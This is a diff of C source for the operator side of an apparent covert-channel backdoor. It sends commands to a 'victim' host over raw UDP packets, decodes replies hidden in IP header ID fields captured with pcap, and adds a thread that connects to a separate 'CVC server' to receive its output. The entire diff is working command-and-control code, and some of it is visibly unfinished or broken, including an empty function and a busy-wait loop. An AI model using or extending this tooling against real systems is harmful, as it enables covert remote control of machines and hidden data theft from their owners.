@@ -1,17 +1,14 @@
 #include "attacker.h"
 
-pid_t pid;
-
 int main(void) {
     struct options_attacker opts;
     u_char* args = NULL;
     char errbuf[PCAP_ERRBUF_SIZE] = {0};
     char* nic_interface;
-    bpf_u_int32 netp;
-    bpf_u_int32 maskp;
+    bpf_u_int32 netp, maskp;
     pcap_t* nic_fd;
     struct bpf_program fp;
-    pthread_t thread;
+    pthread_t udp_thread, tcp_thread;
 
     check_root_user();
     signal(SIGINT,sig_handler);
@@ -23,7 +20,13 @@ int main(void) {
     puts("============ Initialize program ============");
     fflush(stdout);
 
-    if (pthread_create(&thread, NULL, select_call, (void*)&opts) != 0) {
+
+    if (pthread_create(&udp_thread, NULL, udp_select_call, (void*)&opts) != 0) {
+        perror("pthread_create error");
+        exit(EXIT_FAILURE);
+    }
+
+    if (pthread_create(&tcp_thread, NULL, cvc_checker, (void*)&opts) != 0) {
         perror("pthread_create error");
         exit(EXIT_FAILURE);
     }
@@ -84,11 +87,12 @@ bool is_valid_ipaddress(char *ip_address) {
 }
 
 
-void create_attacker_socket(struct options_attacker *opts, struct sockaddr_in* victim_address) {
-    memset(victim_address, 0, sizeof(struct sockaddr_in));
+void create_attacker_udp_socket(struct options_attacker *opts, struct sockaddr_in* victim_address) {
     int enable = 1;
+    memset(victim_address, 0, sizeof(struct sockaddr_in));
 
     opts->attacker_socket_udp = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+
     if (opts->attacker_socket_udp == -1) {
         perror("socket() ERROR\n");
         exit(EXIT_FAILURE);
@@ -99,11 +103,14 @@ void create_attacker_socket(struct options_attacker *opts, struct sockaddr_in* v
         exit(EXIT_FAILURE);
     }
 
+
+    // VICTIM SERVER
     victim_address->sin_family = AF_INET;
     victim_address->sin_port = htons(DEFAULT_PORT);
     victim_address->sin_addr.s_addr = inet_addr(opts->victim_ip);
 
-    if (victim_address->sin_addr.s_addr == (in_addr_t) -1) {
+
+    if (victim_address->sin_addr.s_addr == (in_addr_t) - 1) {
         fatal_errno(__FILE__, __func__, __LINE__, errno, 2);
     }
 }
@@ -151,19 +158,15 @@ unsigned short create_ip_header(struct iphdr* ih, char c, struct options_attacke
 }
 
 
-void* select_call(void* arg) {
+void* udp_select_call(void* arg) {
     struct options_attacker *opts = (struct options_attacker*)arg;
     struct sockaddr_in victim_address;
-    char buffer[RECEIVE_SIZE] = {0};
     char instruction[64] = {0}, s_buffer[SEND_SIZE] = {0};
-    int len = sizeof(victim_address);
     int byte;
 
     fd_set reads, cpy_reads;
     struct timeval timeout;
     int fd_max, fd_num;
-
-    int exit_flag = 0;
 
     struct iphdr ih;
     struct udphdr uh;
@@ -172,14 +175,14 @@ void* select_call(void* arg) {
     timeout.tv_sec = 1;
     timeout.tv_usec = 0;
 
+    create_attacker_udp_socket(opts, &victim_address);
+
     FD_ZERO(&reads);
     FD_SET(STDIN_FILENO, &reads);
-    FD_SET(opts->attacker_socket_udp, &reads);
-    fd_max = opts->attacker_socket_udp;
 
-    create_attacker_socket(opts, &victim_address);
+    fd_max = STDIN_FILENO;
+
     while (1) {
-        if (exit_flag == 1) break;
         cpy_reads = reads;
         fd_num = select(fd_max + 1, &cpy_reads, 0, 0, &timeout);
         if (fd_num == -1) {
@@ -189,24 +192,14 @@ void* select_call(void* arg) {
         else if (fd_num == 0) continue; // time out
         for (int i = 0; i < fd_max + 1; i++) {
             if (FD_ISSET(i, &cpy_reads)) {
-//                if (i == opts->attacker_socket_udp) {
-//                    read(opts->attacker_socket_udp, (struct recv_udp *)&recv_pkt, 64);
-//                    printf("[ TARGET RESPONSE ]\n%s\n", buffer);
-//                    memset(buffer, 0, sizeof(char) * 256);
-//                }
                 if (i == STDIN_FILENO) {
                     puts("============ RESULT ============");
                     if (fgets(opts->victim_instruction, sizeof(opts->victim_instruction), stdin)) {
                         opts->victim_instruction[strlen(opts->victim_instruction) - 1] = 0;
-                        if (strcmp(opts->victim_instruction, QUIT) == 0) {
-                            // TODO: CLOSE ENTIRE PROGRAM
-                            sendto(opts->attacker_socket_udp, opts->victim_instruction, strlen(opts->victim_instruction), 0, (const struct sockaddr*)&victim_address, sizeof(victim_address));
-                            puts("closing program ...");
-                            close(opts->attacker_socket_udp);
-                            exit_flag = 1;
-                            break;
+                        if (strstr(opts->victim_instruction, "cvc") != NULL) {
+                            strcpy(opts->cvc_ip, opts->victim_instruction + 4);
+                            opts->cvc = TRUE;
                         }
-
                         sprintf(instruction, "[[%s]]", opts->victim_instruction);
                         length = strlen(instruction);
                         for (int j = 0; j < length; j++) {
@@ -247,12 +240,110 @@ void process_ipv4(u_char *args, const struct pcap_pkthdr* pkthdr, const u_char* 
     struct ether_header* ether;
     struct iphdr *ip;
 
-    char temp[2] = {0};
-    uint16_t c;
-
     ether = (struct ether_header*)(packet);
     ip = (struct iphdr*)(((char*) ether) + sizeof(struct ether_header));
     setvbuf(stdout, NULL, _IONBF, 0);
     setvbuf(stderr, NULL, _IONBF, 0);
     printf("%c", (char)hide_data(ntohs(ip->id)));
 }
+
+
+int get_max_socket_number(struct options_attacker *opts) {
+
+}
+
+
+void* cvc_checker(void* arg) {
+    struct options_attacker *opts = (struct options_attacker*)arg;
+    struct sockaddr_in cvc_address;
+
+    memset(&cvc_address, 0, sizeof(struct sockaddr_in));
+    while (1) {
+        if(opts->cvc == TRUE) break;
+    }
+    tcp_select_call(opts, cvc_address);
+}
+
+
+void create_attacker_cvc_socket(struct options_attacker *opts, struct sockaddr_in *cvc_address) {
+    opts->attacker_socket_tcp = socket(AF_INET, SOCK_STREAM, 0);
+
+    if (opts->attacker_socket_tcp == -1) {
+        perror("socket() ERROR\n");
+        exit(EXIT_FAILURE);
+    }
+
+    // VICTIM SERVER
+    cvc_address->sin_family = AF_INET;
+    cvc_address->sin_port = htons(CVC_PORT);
+    cvc_address->sin_addr.s_addr = inet_addr(opts->cvc_ip);
+
+    if (cvc_address->sin_addr.s_addr == (in_addr_t) - 1) {
+        fatal_errno(__FILE__, __func__, __LINE__, errno, 2);
+    }
+}
+
+
+
+void tcp_select_call(struct options_attacker *opts, struct sockaddr_in cvc_address) {
+    char buffer[RECEIVE_SIZE] = {0};
+
+    fd_set reads, cpy_reads;
+    struct timeval timeout;
+    int fd_max, fd_num;
+
+    size_t length = 0;
+    int enable = 1;
+
+    timeout.tv_sec = 1;
+    timeout.tv_usec = 0;
+
+    create_attacker_cvc_socket(opts, &cvc_address);
+
+    // VICTIM SERVER
+    cvc_address.sin_family = AF_INET;
+    cvc_address.sin_port = htons(CVC_PORT);
+    cvc_address.sin_addr.s_addr = inet_addr(opts->cvc_ip);
+
+
+    if (cvc_address.sin_addr.s_addr == (in_addr_t) - 1) {
+        fatal_errno(__FILE__, __func__, __LINE__, errno, 2);
+    }
+
+    sleep(1);
+    if (connect(opts->attacker_socket_tcp, (struct sockaddr*)&cvc_address,
+                sizeof(cvc_address)) < 0) {
+        printf("connect() failed\n");
+        exit(1);
+    }
+
+    FD_ZERO(&reads);
+    FD_SET(opts->attacker_socket_tcp, &reads);
+
+
+    fd_max = opts->attacker_socket_tcp;
+
+    while (1) {
+        cpy_reads = reads;
+        fd_num = select(fd_max + 1, &cpy_reads, 0, 0, &timeout);
+        if (fd_num == -1) {
+            perror("Select() failed");
+            exit(EXIT_FAILURE);
+        }
+        else if (fd_num == 0) continue; // time out
+        for (int i = 0; i < fd_max + 1; i++) {
+            if (FD_ISSET(i, &cpy_reads)) {
+                if (opts->attacker_socket_tcp != 0) {
+                    if (i == opts->attacker_socket_tcp) {
+                        if (read(opts->attacker_socket_tcp, buffer, 256) > 0) {
+                            printf("[ CVC SERVER ]: %s\n", buffer);
+                            memset(buffer, 0, sizeof(char) * 256);
+                        }
+                    }
+                }
+            }
+        }
+    }
+}
+
+
